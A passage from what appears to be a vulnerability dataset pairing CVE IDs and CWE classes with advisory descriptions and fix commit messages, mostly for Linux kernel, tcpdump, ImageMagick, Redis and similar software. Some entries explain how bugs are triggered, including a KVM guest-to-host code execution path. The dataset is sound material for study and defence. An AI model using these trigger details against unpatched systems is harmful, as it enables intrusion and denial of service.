<+53>:    xchg   %ax,%ax    0xffffffff817be9a7 <+55>:    pop    %rbx    0xffffffff817be9a8 <+56>:    pop    %rbp    0xffffffff817be9a9 <+57>:    mov    $0x200,%esi    0xffffffff817be9ae <+62>:    mov    $0xffffffff817be993,%rdi    0xffffffff817be9b5 <+69>:    jmpq   0xffffffff81063aa0 <__local_bh_enable_ip>    0xffffffff817be9ba <+74>:    mov    %rbp,%rdi    0xffffffff817be9bd <+77>:    callq  0xffffffff817be8c0 <__lock_sock>    0xffffffff817be9c2 <+82>:    jmp    0xffffffff817be993 <lock_sock_nested+35> End of assembler dump.  NATIVE:  (gdb) disassemble lock_sock_nested Dump of assembler code for function lock_sock_nested:    0xffffffff817be970 <+0>:     push   %rbp    0xffffffff817be971 <+1>:     mov    %rdi,%rbp    0xffffffff817be974 <+4>:     push   %rbx    0xffffffff817be975 <+5>:     lea    0x88(%rbp),%rbx    0xffffffff817be97c <+12>:    callq  0xffffffff819f7160 <_cond_resched>    0xffffffff817be981 <+17>:    mov    %rbx,%rdi    0xffffffff817be984 <+20>:    callq  0xffffffff819fbb00 <_raw_spin_lock_bh>    0xffffffff817be989 <+25>:    mov    0x8c(%rbp),%eax    0xffffffff817be98f <+31>:    test   %eax,%eax    0xffffffff817be991 <+33>:    jne    0xffffffff817be9ba <lock_sock_nested+74>    0xffffffff817be993 <+35>:    movl   $0x1,0x8c(%rbp)    0xffffffff817be99d <+45>:    mov    %rbx,%rdi    0xffffffff817be9a0 <+48>:    movb   $0x0,(%rdi)    0xffffffff817be9a3 <+51>:    nopl   0x0(%rax)    0xffffffff817be9a7 <+55>:    pop    %rbx    0xffffffff817be9a8 <+56>:    pop    %rbp    0xffffffff817be9a9 <+57>:    mov    $0x200,%esi    0xffffffff817be9ae <+62>:    mov    $0xffffffff817be993,%rdi    0xffffffff817be9b5 <+69>:    jmpq   0xffffffff81063ae0 <__local_bh_enable_ip>    0xffffffff817be9ba <+74>:    mov    %rbp,%rdi    0xffffffff817be9bd <+77>:    callq  0xffffffff817be8c0 <__lock_sock>    0xffffffff817be9c2 <+82>:    jmp    0xffffffff817be993 <lock_sock_nested+35> End of assembler dump.   Fixes: 63f7027 (""[PATCH] i386: PARAVIRT: add common patching machinery"") Fixes: 3010a06 (""x86/paravirt, objtool: Annotate indirect calls"") Reported-by: Nadav Amit <namit@vmware.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Reviewed-by: Juergen Gross <jgross@suse.com> Cc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: Boris Ostrovsky <boris.ostrovsky@oracle.com> Cc: David Woodhouse <dwmw2@infradead.org> Cc: stable@vger.kernel.org"
CVE-2018-11218,CWE-787,2018-06-17,"Memory Corruption was discovered in the cmsgpack library in the Lua subsystem in Redis before 3.2.12, 4.x before 4.0.10, and 5.x before 5.0 RC2 because of stack-based buffer overflows.","@soloestoy sent me this additional fixes, after searching for similar problems to the one reported in mp_pack(). I'm committing the changes because it was not possible during to make a public PR to protect Redis users and give Redis providers some time to patch their systems."
CVE-2018-8828,CWE-193,2018-03-20,"A Buffer Overflow issue was discovered in Kamailio before 4.4.7, 5.0.x before 5.0.6, and 5.1.x before 5.1.2. A specially crafted REGISTER message with a malformed branch or From tag triggers an off-by-one heap-based buffer overflow in the tmx_check_pretran function in modules/tmx/tmx_pretran.c.",- reported by Alfred Farrugia and Sandro Gauci
CVE-2018-20784,CWE-835,2019-02-22,"In the Linux kernel before 4.20.2, kernel/sched/fair.c mishandles leaf cfs_rq's, which allows attackers to cause a denial of service (infinite loop in update_blocked_averages) or possibly have unspecified other impact by inducing a high load.",
CVE-2015-3339,CWE-362,2015-05-27,"Race condition in the prepare_binprm function in fs/exec.c in the Linux kernel before 3.19.6 allows local users to gain privileges by executing a setuid program at a time instant when a chown to root is in progress, and the ownership is changed but the setuid bit is not yet stripped.","This prevents a race between chown() and execve(), where chowning a setuid-user binary to root would momentarily make the binary setuid root.  This patch was mostly written by Linus Torvalds.  Signed-off-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-3181,CWE-119,2014-09-28,Multiple stack-based buffer overflows in the magicmouse_raw_event function in drivers/hid/hid-magicmouse.c in the Magic Mouse HID driver in the Linux kernel through 3.16.3 allow physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that provides a large amount of (1) EHCI or (2) XHCI data associated with an event.,"The report passed to us from transport driver could potentially be arbitrarily large, therefore we better sanity-check it so that magicmouse_emit_touch() gets only valid values of raw_id.  Cc: stable@vger.kernel.org Reported-by: Steven Vittitoe <scvitti@google.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2013-4129,CWE-20,2013-07-29,"The bridge multicast implementation in the Linux kernel through 3.10.3 does not check whether a certain timer is armed before modifying the timeout value of that timer, which allows local users to cause a denial of service (BUG and system crash) via vectors involving the shutdown of a KVM virtual machine, related to net/bridge/br_mdb.c and net/bridge/br_multicast.c.","Several people reported the warning: ""kernel BUG at kernel/timer.c:729!"" and the stack trace is:  	#7 [ffff880214d25c10] mod_timer+501 at ffffffff8106d905 	#8 [ffff880214d25c50] br_multicast_del_pg.isra.20+261 at ffffffffa0731d25 [bridge] 	#9 [ffff880214d25c80] br_multicast_disable_port+88 at ffffffffa0732948 [bridge] 	#10 [ffff880214d25cb0] br_stp_disable_port+154 at ffffffffa072bcca [bridge] 	#11 [ffff880214d25ce8] br_device_event+520 at ffffffffa072a4e8 [bridge] 	#12 [ffff880214d25d18] notifier_call_chain+76 at ffffffff8164aafc 	#13 [ffff880214d25d50] raw_notifier_call_chain+22 at ffffffff810858f6 	#14 [ffff880214d25d60] call_netdevice_notifiers+45 at ffffffff81536aad 	#15 [ffff880214d25d80] dev_close_many+183 at ffffffff81536d17 	#16 [ffff880214d25dc0] rollback_registered_many+168 at ffffffff81537f68 	#17 [ffff880214d25de8] rollback_registered+49 at ffffffff81538101 	#18 [ffff880214d25e10] unregister_netdevice_queue+72 at ffffffff815390d8 	#19 [ffff880214d25e30] __tun_detach+272 at ffffffffa074c2f0 [tun] 	#20 [ffff880214d25e88] tun_chr_close+45 at ffffffffa074c4bd [tun] 	#21 [ffff880214d25ea8] __fput+225 at ffffffff8119b1f1 	#22 [ffff880214d25ef0] ____fput+14 at ffffffff8119b3fe 	#23 [ffff880214d25f00] task_work_run+159 at ffffffff8107cf7f 	#24 [ffff880214d25f30] do_notify_resume+97 at ffffffff810139e1 	#25 [ffff880214d25f50] int_signal+18 at ffffffff8164f292  this is due to I forgot to check if mp->timer is armed in br_multicast_del_pg(). This bug is introduced by commit 9f00b2e (bridge: only expire the mdb entry when query is received).  Same for __br_mdb_del().  Tested-by: poma <pomidorabelisima@gmail.com> Reported-by: LiYonghua <809674045@qq.com> Reported-by: Robert Hancock <hancockrwd@gmail.com> Cc: Herbert Xu <herbert@gondor.apana.org.au> Cc: Stephen Hemminger <stephen@networkplumber.org> Cc: ""David S. Miller"" <davem@davemloft.net> Signed-off-by: Cong Wang <amwang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11142,CWE-400,2017-07-10,"In PHP before 5.6.31, 7.x before 7.0.17, and 7.1.x before 7.1.3, remote attackers could cause a CPU consumption denial of service attack by injecting long form variables, related to main/php_variables.c.",
CVE-2012-2870,CWE-399,2012-08-31,"libxslt 1.1.26 and earlier, as used in Google Chrome before 21.0.1180.89, does not properly manage memory, which might allow remote attackers to cause a denial of service (application crash) via a crafted XSLT expression that is not properly identified during XPath navigation, related to (1) the xsltCompileLocationPathPattern function in libxslt/pattern.c and (2) the xsltGenerateIdFunction function in libxslt/functions.c.",
CVE-2013-0871,CWE-362,2013-02-18,"Race condition in the ptrace functionality in the Linux kernel before 3.7.5 allows local users to gain privileges via a PTRACE_SETREGS ptrace system call in a crafted application, as demonstrated by ptrace_death.","putreg() assumes that the tracee is not running and pt_regs_access() can safely play with its stack.  However a killed tracee can return from ptrace_stop() to the low-level asm code and do RESTORE_REST, this means that debugger can actually read/modify the kernel stack until the tracee does SAVE_REST again.  set_task_blockstep() can race with SIGKILL too and in some sense this race is even worse, the very fact the tracee can be woken up breaks the logic.  As Linus suggested we can clear TASK_WAKEKILL around the arch_ptrace() call, this ensures that nobody can ever wakeup the tracee while the debugger looks at it.  Not only this fixes the mentioned problems, we can do some cleanups/simplifications in arch_ptrace() paths.  Probably ptrace_unfreeze_traced() needs more callers, for example it makes sense to make the tracee killable for oom-killer before access_process_vm().  While at it, add the comment into may_ptrace_stop() to explain why ptrace_stop() still can't rely on SIGKILL and signal_pending_state().  Reported-by: Salman Qazi <sqazi@google.com> Reported-by: Suleiman Souhlal <suleiman@google.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Oleg Nesterov <oleg@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-10270,CWE-125,2017-03-24,"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (heap-based buffer over-read) or possibly have unspecified other impact via a crafted TIFF image, related to ""READ of size 8"" and libtiff/tif_read.c:523:22.","instanciate compute ntrips as TIFFhowmany_32(td->td_imagelength, rowsperstrip), instead of a logic based on the total size of data. Which is faulty is the total size of data is not sufficient to fill the whole image, and thus results in reading outside of the StripByCounts/StripOffsets arrays when using TIFFReadScanline(). Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2608.  * libtiff/tif_strip.c: revert the change in TIFFNumberOfStrips() done for http://bugzilla.maptools.org/show_bug.cgi?id=2587 / CVE-2016-9273 since the above change is a better fix that makes it unnecessary."
CVE-2015-5307,CWE-399,2015-11-16,"The KVM subsystem in the Linux kernel through 4.2.6, and Xen 4.3.x through 4.6.x, allows guest OS users to cause a denial of service (host OS panic or hang) by triggering many #AC (aka Alignment Check) exceptions, related to svm.c and vmx.c.","It was found that a guest can DoS a host by triggering an infinite stream of ""alignment check"" (#AC) exceptions.  This causes the microcode to enter an infinite loop where the core never receives another interrupt.  The host kernel panics pretty quickly due to the effects (CVE-2015-5307).  Signed-off-by: Eric Northup <digitaleric@google.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2017-5548,CWE-119,2017-02-06,"drivers/net/ieee802154/atusb.c in the Linux kernel 4.9.x before 4.9.6 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.",From 4.9 we should really avoid using the stack here as this will not be DMA able on various platforms. This changes the buffers already being present in time of 4.9 being released. This should go into stable as well.  Reported-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@vger.kernel.org Signed-off-by: Stefan Schmidt <stefan@osg.samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>
CVE-2010-1152,CWE-20,2010-04-12,memcached.c in memcached before 1.4.3 allows remote attackers to cause a denial of service (daemon hang or crash) via a long line that triggers excessive memory allocation.  NOTE: some of these details are obtained from third party information.,
CVE-2011-2479,CWE-399,2013-03-01,"The Linux kernel before 2.6.39 does not properly create transparent huge pages in response to a MAP_PRIVATE mmap system call on /dev/zero, which allows local users to cause a denial of service (system crash) via a crafted application.","The huge_memory.c THP page fault was allowed to run if vm_ops was null (which would succeed for /dev/zero MAP_PRIVATE, as the f_op->mmap wouldn't setup a special vma->vm_ops and it would fallback to regular anonymous memory) but other THP logics weren't fully activated for vmas with vm_file not NULL (/dev/zero has a not NULL vma->vm_file).  So this removes the vm_file checks so that /dev/zero also can safely use THP (the other albeit safer approach to fix this bug would have been to prevent the THP initial page fault to run if vm_file was set).  After removing the vm_file checks, this also makes huge_memory.c stricter in khugepaged for the DEBUG_VM=y case.  It doesn't replace the vm_file check with a is_pfn_mapping check (but it keeps checking for VM_PFNMAP under VM_BUG_ON) because for a is_cow_mapping() mapping VM_PFNMAP should only be allowed to exist before the first page fault, and in turn when vma->anon_vma is null (so preventing khugepaged registration).  So I tend to think the previous comment saying if vm_file was set, VM_PFNMAP might have been set and we could still be registered in khugepaged (despite anon_vma was not NULL to be registered in khugepaged) was too paranoid. The is_linear_pfn_mapping check is also I think superfluous (as described by comment) but under DEBUG_VM it is safe to stay.  Addresses https://bugzilla.kernel.org/show_bug.cgi?id=33682  Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Reported-by: Caspar Zhang <bugs@casparzhang.com> Acked-by: Mel Gorman <mel@csn.ul.ie> Acked-by: Rik van Riel <riel@redhat.com> Cc: <stable@kernel.org>		[2.6.38.x] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-12819,CWE-416,2019-06-14,"An issue was discovered in the Linux kernel before 5.0. The function __mdiobus_register() in drivers/net/phy/mdio_bus.c calls put_device(), which will trigger a fixed_mdio_bus_init use-after-free. This will cause a denial of service.","KASAN has found use-after-free in fixed_mdio_bus_init, commit 0c692d0 (""drivers/net/phy/mdio_bus.c: call put_device on device_register() failure"") call put_device() while device_register() fails,give up the last reference to the device and allow mdiobus_release to be executed ,kfreeing the bus. However in most drives, mdiobus_free be called to free the bus while mdiobus_register fails. use-after-free occurs when access bus again, this patch revert it to let mdiobus_free free the bus.  KASAN report details as below:  BUG: KASAN: use-after-free in mdiobus_free+0x85/0x90 drivers/net/phy/mdio_bus.c:482 Read of size 4 at addr ffff8881dc824d78 by task syz-executor.0/3524  CPU: 1 PID: 3524 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 Call Trace:  __dump_stack lib/dump_stack.c:77 [inline]  dump_stack+0xfa/0x1ce lib/dump_stack.c:113  print_address_description+0x65/0x270 mm/kasan/report.c:187  kasan_report+0x149/0x18d mm/kasan/report.c:317  mdiobus_free+0x85/0x90 drivers/net/phy/mdio_bus.c:482  fixed_mdio_bus_init+0x283/0x1000 [fixed_phy]  ? 0xffffffffc0e40000  ? 0xffffffffc0e40000  ? 0xffffffffc0e40000  do_one_initcall+0xfa/0x5ca init/main.c:887  do_init_module+0x204/0x5f6 kernel/module.c:3460  load_module+0x66b2/0x8570 kernel/module.c:3808  __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902  do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe RIP: 0033:0x462e99 Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007f6215c19c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139 RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99 RDX: 0000000000000000 RSI: 0000000020000080 RDI: 0000000000000003 RBP: 00007f6215c19c70 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 00007f6215c1a6bc R13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004  Allocated by task 3524:  set_track mm/kasan/common.c:85 [inline]  __kasan_kmalloc.constprop.3+0xa0/0xd0 mm/kasan/common.c:496  kmalloc include/linux/slab.h:545 [inline]  kzalloc include/linux/slab.h:740 [inline]  mdiobus_alloc_size+0x54/0x1b0 drivers/net/phy/mdio_bus.c:143  fixed_mdio_bus_init+0x163/0x1000 [fixed_phy]  do_one_initcall+0xfa/0x5ca init/main.c:887  do_init_module+0x204/0x5f6 kernel/module.c:3460  load_module+0x66b2/0x8570 kernel/module.c:3808  __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902  do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe  Freed by task 3524:  set_track mm/kasan/common.c:85 [inline]  __kasan_slab_free+0x130/0x180 mm/kasan/common.c:458  slab_free_hook mm/slub.c:1409 [inline]  slab_free_freelist_hook mm/slub.c:1436 [inline]  slab_free mm/slub.c:2986 [inline]  kfree+0xe1/0x270 mm/slub.c:3938  device_release+0x78/0x200 drivers/base/core.c:919  kobject_cleanup lib/kobject.c:662 [inline]  kobject_release lib/kobject.c:691 [inline]  kref_put include/linux/kref.h:67 [inline]  kobject_put+0x146/0x240 lib/kobject.c:708  put_device+0x1c/0x30 drivers/base/core.c:2060  __mdiobus_register+0x483/0x560 drivers/net/phy/mdio_bus.c:382  fixed_mdio_bus_init+0x26b/0x1000 [fixed_phy]  do_one_initcall+0xfa/0x5ca init/main.c:887  do_init_module+0x204/0x5f6 kernel/module.c:3460  load_module+0x66b2/0x8570 kernel/module.c:3808  __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902  do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe  The buggy address belongs to the object at ffff8881dc824c80  which belongs to the cache kmalloc-2k of size 2048 The buggy address is located 248 bytes inside of  2048-byte region [ffff8881dc824c80, ffff8881dc825480) The buggy address belongs to the page: page:ffffea0007720800 count:1 mapcount:0 mapping:ffff8881f6c02800 index:0x0 compound_mapcount: 0 flags: 0x2fffc0000010200(slab|head) raw: 02fffc0000010200 0000000000000000 0000000500000001 ffff8881f6c02800 raw: 0000000000000000 00000000800f000f 00000001ffffffff 0000000000000000 page dumped because: kasan: bad access detected  Memory state around the buggy address:  ffff8881dc824c00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc  ffff8881dc824c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb >ffff8881dc824d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb                                                                 ^  ffff8881dc824d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff8881dc824e00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  Fixes: 0c692d0 (""drivers/net/phy/mdio_bus.c: call put_device on device_register() failure"") Signed-off-by: YueHaibing <yuehaibing@huawei.com> Reviewed-by: Andrew Lunn <andrew@lunn.ch> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-14882,CWE-125,2019-10-03,The ICMPv6 parser in tcpdump before 4.9.3 has a buffer over-read in print-icmp6.c.,Moreover: Add and use *_tstr[] strings. Update four tests outputs accordingly. Fix a space.  Wang Junjie of 360 ESG Codesafe Team had independently identified this vulnerability in 2018 by means of fuzzing and provided the packet capture file for the test.
CVE-2016-6250,CWE-190,2016-09-21,"Integer overflow in the ISO9660 writer in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) or execute arbitrary code via vectors related to verifying filename lengths when writing an ISO9660 archive, which trigger a buffer overflow.","* Don't cast size_t to int, since this can lead to overflow   on machines where sizeof(int) < sizeof(size_t) * Check a + b > limit by writing it as     a > limit || b > limit || a + b > limit   to avoid problems when a + b wraps around."
CVE-2017-9203,CWE-787,2017-05-23,"imagew-main.c:960:12 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (buffer underflow) via a crafted image, related to imagew-bmp.c.",The bug could happen when transparency is removed from an image. Also fixed a semi-related BMP error handling logic bug. Fixes issue #21
CVE-2016-10071,CWE-125,2017-03-02,coders/mat.c in ImageMagick before 6.9.4-0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted mat file.,
CVE-2012-2375,CWE-189,2012-06-13,"The __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.",_copy_from_pages() used to copy data from the temporary buffer to the user passed buffer is passed the wrong size parameter when copying data. res.acl_len contains both the bitmap and acl lenghts while acl_len contains the acl length after adjusting for the bitmap size.  Signed-off-by: Sachin Prabhu <sprabhu@redhat.com> Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>
CVE-2013-0871,CWE-362,2013-02-18,"Race condition in the ptrace functionality in the Linux kernel before 3.7.5 allows local users to gain privileges via a PTRACE_SETREGS ptrace system call in a crafted application, as demonstrated by ptrace_death.","putreg() assumes that the tracee is not running and pt_regs_access() can safely play with its stack.  However a killed tracee can return from ptrace_stop() to the low-level asm code and do RESTORE_REST, this means that debugger can actually read/modify the kernel stack until the tracee does SAVE_REST again.  set_task_blockstep() can race with SIGKILL too and in some sense this race is even worse, the very fact the tracee can be woken up breaks the logic.  As Linus suggested we can clear TASK_WAKEKILL around the arch_ptrace() call, this ensures that nobody can ever wakeup the tracee while the debugger looks at it.  Not only this fixes the mentioned problems, we can do some cleanups/simplifications in arch_ptrace() paths.  Probably ptrace_unfreeze_traced() needs more callers, for example it makes sense to make the tracee killable for oom-killer before access_process_vm().  While at it, add the comment into may_ptrace_stop() to explain why ptrace_stop() still can't rely on SIGKILL and signal_pending_state().  Reported-by: Salman Qazi <sqazi@google.com> Reported-by: Suleiman Souhlal <suleiman@google.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Oleg Nesterov <oleg@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-12877,CWE-416,2017-08-28,Use-after-free vulnerability in the DestroyImage function in image.c in ImageMagick before 7.0.6-6 allows remote attackers to cause a denial of service via a crafted file.,
CVE-2017-13001,CWE-125,2017-09-14,The NFS parser in tcpdump before 4.9.2 has a buffer over-read in print-nfs.c:nfs_printfh().,"Also, put the buffer on the stack; no reason to make it static.  (65 bytes isn't a lot.)  This fixes a buffer over-read discovered by Kamil Frankowicz.  Add a test using the capture file supplied by the reporter(s)."
CVE-2018-1000127,CWE-190,2018-03-13,memcached version prior to 1.4.37 contains an Integer Overflow vulnerability in items.c:item_free() that can result in data corruption and deadlocks due to items existing in hash table being reused from free list. This attack appear to be exploitable via network connectivity to the memcached service. This vulnerability appears to have been fixed in 1.4.37 and later.,Counts as a miss if the refcount is too high. ASCII multigets are the only time refcounts can be held for so long.  doing a dirty read of refcount. is aligned.  trying to avoid adding an extra refcount branch for all calls of item_get due to performance. might be able to move it in there after logging refactoring simplifies some of the branches.
CVE-2014-9584,CWE-20,2015-01-09,"The parse_rock_ridge_inode_internal function in fs/isofs/rock.c in the Linux kernel before 3.18.2 does not validate a length value in the Extensions Reference (ER) System Use Field, which allows local users to obtain sensitive information from kernel memory via a crafted iso9660 image.",We didn't check length of rock ridge ER records before printing them. Thus corrupted isofs image can cause us to access and print some memory behind the buffer with obvious consequences.  Reported-and-tested-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2017-5970,CWE-476,2017-02-14,The ipv4_pktinfo_prepare function in net/ipv4/ip_sockglue.c in the Linux kernel through 4.9.9 allows attackers to cause a denial of service (system crash) via (1) an application that makes crafted system calls or possibly (2) IPv4 traffic with invalid IP options.,"Andrey Konovalov got crashes in __ip_options_echo() when a NULL skb->dst is accessed.  ipv4_pktinfo_prepare() should not drop the dst if (evil) IP options are present.  We could refine the test to the presence of ts_needtime or srr, but IP options are not often used, so let's be conservative.  Thanks to syzkaller team for finding this bug.  Fixes: d826eb1 (""ipv4: PKTINFO doesnt need dst reference"") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-3552,CWE-362,2012-10-03,Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.,"We lack proper synchronization to manipulate inet->opt ip_options  Problem is ip_make_skb() calls ip_setup_cork() and ip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options), without any protection against another thread manipulating inet->opt.  Another thread can change inet->opt pointer and free old one under us.  Use RCU to protect inet->opt (changed to inet->inet_opt).  Instead of handling atomic refcounts, just copy ip_options when necessary, to avoid cache line dirtying.  We cant insert an rcu_head in struct ip_options since its included in skb->cb[], so this patch is large because I had to introduce a new ip_options_rcu structure.  Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Cc: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-13687,CWE-125,2017-09-14,The Cisco HDLC parser in tcpdump before 4.9.2 has a buffer over-read in print-chdlc.c:chdlc_print().,"This is for the fix made a few commits before, which had no tests.  Add a test using the capture file supplied by Kamil Frankowicz."
CVE-2006-3635,CWE-119,2017-08-07,The ia64 subsystem in the Linux kernel before 2.6.26 allows local users to cause a denial of service (stack consumption and system crash) via a crafted application that leverages the mishandling of invalid Register Stack Engine (RSE) state.,"Problem: An application violating the architectural rules regarding operation dependencies and having specific Register Stack Engine (RSE) state at the time of the violation, may result in an illegal operation fault and invalid RSE state.  Such faults may initiate a cascade of repeated illegal operation faults within OS interruption handlers. The specific behavior is OS dependent.  Implication: An application causing an illegal operation fault with specific RSE state may result in a series of illegal operation faults and an eventual OS stack overflow condition.  Workaround: OS interruption handlers that switch to kernel backing store implement a check for invalid RSE state to avoid the series of illegal operation faults.  The core of the workaround is the RSE_WORKAROUND code sequence inserted into each invocation of the SAVE_MIN_WITH_COVER and SAVE_MIN_WITH_COVER_R19 macros.  This sequence includes hard-coded constants that depend on the number of stacked physical registers being 96.  The rest of this patch consists of code to disable this workaround should this not be the case (with the presumption that if a future Itanium processor increases the number of registers, it would also remove the need for this patch).  Move the start of the RBS up to a mod32 boundary to avoid some corner cases.  The dispatch_illegal_op_fault code outgrew the spot it was squatting in when built with this patch and CONFIG_VIRT_CPU_ACCOUNTING=y Move it out to the end of the ivt.  Signed-off-by: Tony Luck <tony.luck@intel.com>"
CVE-2018-11382,CWE-125,2018-05-22,The _inst__sts() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.,
CVE-2013-2146,CWE-20,2013-06-07,"arch/x86/kernel/cpu/perf_event_intel.c in the Linux kernel before 3.8.9, when the Performance Events Subsystem is enabled, specifies an incorrect bitmask, which allows local users to cause a denial of service (general protection fault and system crash) by attempting to set a reserved bit.",
CVE-2016-8860,CWE-119,2017-01-04,"Tor before 0.2.8.9 and 0.2.9.x before 0.2.9.4-alpha had internal functions that were entitled to expect that buf_t data had NUL termination, but the implementation of or/buffers.c did not ensure that NUL termination was present, which allows remote attackers to cause a denial of service (client, hidden service, relay, or authority crash) via crafted data.",This helps protect against bugs where any part of a buf_t's memory is passed to a function that expects a NUL-terminated input.  It also closes TROVE-2016-10-001 (aka bug 20384).
CVE-2017-18255,CWE-190,2018-03-31,"The perf_cpu_time_max_percent_handler function in kernel/events/core.c in the Linux kernel before 4.11 allows local users to cause a denial of service (integer overflow) or possibly have unspecified other impact via a large value, as demonstrated by an incorrect sample-rate calculation.","Use ""proc_dointvec_minmax"" instead of ""proc_dointvec"" to check the input value from user-space.  If not, we can set a big value and some vars will overflow like ""sysctl_perf_event_sample_rate"" which will cause a lot of unexpected problems.  Signed-off-by: Tan Xiaojun <tanxiaojun@huawei.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: <acme@kernel.org> Cc: <alexander.shishkin@linux.intel.com> Cc: Alexander Shishkin <alexander.shishkin@linux.intel.com> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Link: http://lkml.kernel.org/r/1487829879-56237-1-git-send-email-tanxiaojun@huawei.com Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2015-3196,CWE-362,2015-12-06,"ssl/s3_clnt.c in OpenSSL 1.0.0 before 1.0.0t, 1.0.1 before 1.0.1p, and 1.0.2 before 1.0.2d, when used for a multi-threaded client, writes the PSK identity hint to an incorrect data structure, which allows remote servers to cause a denial of service (race condition and double free) via a crafted ServerKeyExchange message.",
CVE-2014-0049,CWE-120,2014-03-11,Buffer overflow in the complete_emulated_mmio function in arch/x86/kvm/x86.c in the Linux kernel before 3.13.6 allows guest OS users to execute arbitrary code on the host OS by leveraging a loop that triggers an invalid memory copy affecting certain cancel_work_item data.,"The problem occurs when the guest performs a pusha with the stack address pointing to an mmio address (or an invalid guest physical address) to start with, but then extending into an ordinary guest physical address.  When doing repeated emulated pushes emulator_read_write sets mmio_needed to 1 on the first one.  On a later push when the stack points to regular memory, mmio_nr_fragments is set to 0, but mmio_is_needed is not set to 0.  As a result, KVM exits to userspace, and then returns to complete_emulated_mmio.  In complete_emulated_mmio vcpu->mmio_cur_fragment is incremented.  The termination condition of vcpu->mmio_cur_fragment == vcpu->mmio_nr_fragments is never achieved. The code bounces back and fourth to userspace incrementing mmio_cur_fragment past it's buffer.  If the guest does nothing else it eventually leads to a a crash on a memcpy from invalid memory address.  However if a guest code can cause the vm to be destroyed in another vcpu with excellent timing, then kvm_clear_async_pf_completion_queue can be used by the guest to control the data that's pointed to by the call to cancel_work_item, which can be used to gain execution.  Fixes: f78146b Signed-off-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org (3.5+) Signed-off-by: Paolo Bonzini 